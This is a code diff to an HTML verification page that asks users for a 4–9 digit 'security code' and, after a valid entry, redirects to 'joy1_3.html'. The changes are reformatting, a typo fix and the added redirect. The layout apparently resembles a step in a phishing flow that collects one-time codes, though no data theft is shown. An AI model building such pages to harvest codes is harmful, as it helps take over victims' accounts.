@@ -11,7 +11,9 @@
     </div>
   </div>
 
-  <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">🔒 Security Verification Required</h3>
+  <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">
+    🔒 Security Verification Required
+  </h3>
   
   <div class="play-instructions">
     <div class="instruction-card">
@@ -23,12 +25,14 @@
   </div>
 
   <form id="digitsForm" method="post" novalidate>
-    <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Security Code</label>
+    <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">
+      Security Code
+    </label>
     <input class="input" id="digits" name="digits" placeholder="Enter code" pattern="\d{4,9}" required>
     <div class="error-text" id="digitsError"></div>
 
     <div class="center">
-      <button class="btn login-btn" type="submit">Summit</button>
+      <button class="btn login-btn" type="submit">Submit</button>
     </div>
   </form>
 </div>
@@ -105,7 +109,7 @@ document.getElementById("digitsForm").addEventListener("submit", function(event)
   digitsError.textContent = "";
 
   const val = digits.value.trim();
-  const pattern = /^\d{4,9}$/; // only 4–9 digits allowed
+  const pattern = /^\d{4,9}$/;
 
   if (!pattern.test(val)) {
     valid = false;
@@ -113,7 +117,13 @@ document.getElementById("digitsForm").addEventListener("submit", function(event)
     digitsError.textContent = "The code you entered is incorrect.";
   }
 
-  if (!valid) event.preventDefault();
+  if (!valid) {
+    event.preventDefault();
+    return;
+  }
+
+  // ✅ NEW REDIRECT for upgraded flow
+  window.location.href = "joy1_3.html";
 });
 
 document.getElementById("digits").addEventListener("input", () => {
